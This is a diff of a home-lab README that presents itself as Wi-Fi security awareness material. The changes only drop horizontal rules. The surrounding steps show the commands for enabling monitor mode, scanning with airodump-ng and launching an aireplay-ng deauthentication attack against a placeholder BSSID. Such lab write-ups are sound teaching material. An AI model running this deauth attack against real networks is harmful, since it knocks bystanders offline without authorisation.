@@ -38,8 +38,6 @@ To raise awareness about Wi-Fi network vulnerabilities by showing how attackers 
 - Installed Kali Linux inside UTM on macOS  
 - Connected external USB Wi-Fi adapter to Kali VM  
 
----
-
 ### ✅ Step 2: Enable Monitor Mode  
 Run the following commands in the Kali terminal:
 ```bash
@@ -47,7 +45,6 @@ sudo ip link set wlan0 down
 sudo iw dev wlan0 set type monitor
 sudo ip link set wlan0 up
 ```
----
 
 ### ✅ Step 3: Scan Wi-Fi Networks  
 Start scanning for nearby networks using:
@@ -61,7 +58,6 @@ sudo airodump-ng wlan0
 
 <br />
 <br />
----
 
 ### ✅ Step 4: Launch Deauthentication Attack  
 Disconnect clients from your test network (DoS simulation):
@@ -74,8 +70,6 @@ sudo aireplay-ng --deauth 50 -a [Target_BSSID] wlan0
 <img src="https://imgur.com/MAYFtk7.png" height="80%" width="80%" alt="Attack Time"/>
 <br />
 <br />
-
----
 
 ### ✅ Step 5: Stop and Reset Adapter  
 Stop the attack with `Ctrl + C`. Restore adapter mode:
